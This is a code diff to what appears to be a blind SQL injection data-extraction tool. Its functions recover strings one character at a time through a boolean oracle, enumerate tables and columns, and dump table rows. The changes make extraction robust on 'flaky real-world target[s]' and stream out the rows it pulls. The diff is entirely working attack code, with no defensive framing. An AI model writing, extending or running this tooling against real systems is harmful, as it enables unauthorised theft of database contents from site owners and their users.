@@ -240,18 +240,25 @@ def extract_int(oracle, expr, cap=1 << 21) -> int:
 
 
 def extract_str(oracle, prof, subquery, maxlen=256) -> str:
-    """The string value of a sub-SELECT, one character at a time."""
+    """The string value of a sub-SELECT, one character at a time.
+
+    Char codes are capped at the Unicode maximum and bounds-checked before
+    chr(): on a noisy/unreliable oracle (a flaky real-world target) the binary
+    search can converge on a junk code — that becomes a '?', never a crash."""
     n = min(extract_int(oracle, prof["length"].format(q=subquery)), maxlen)
     out = []
     for i in range(1, n + 1):
-        code = extract_int(oracle, prof["charcode"].format(q=subquery, i=i))
-        out.append(chr(code) if code else "?")
+        code = extract_int(oracle, prof["charcode"].format(q=subquery, i=i), cap=0x110000)
+        out.append(chr(code) if 0 < code <= 0x10FFFF else "?")
     return "".join(out)
 
 
 def _list(oracle, prof, count_expr, at_tmpl, **fmt):
+    """Yield each value as it's pulled, so a caller can show partial results (and
+    keep what it has if the walk is interrupted)."""
     n = extract_int(oracle, count_expr.format(**fmt))
-    return [extract_str(oracle, prof, at_tmpl.format(k=k, **fmt)) for k in range(n)]
+    for k in range(n):
+        yield extract_str(oracle, prof, at_tmpl.format(k=k, **fmt))
 
 
 def tables(oracle, prof):
@@ -263,11 +270,10 @@ def columns(oracle, prof, table):
 
 
 def dump(oracle, prof, table, cols, limit=20):
+    """Yield rows one at a time (each a list of cell values)."""
     rows_n = min(extract_int(oracle, prof["rows_n"].format(t=table)), limit)
-    rows = []
     for k in range(rows_n):
-        rows.append([extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols])
-    return rows
+        yield [extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols]
 
 
 # ============================ union-based ===============================
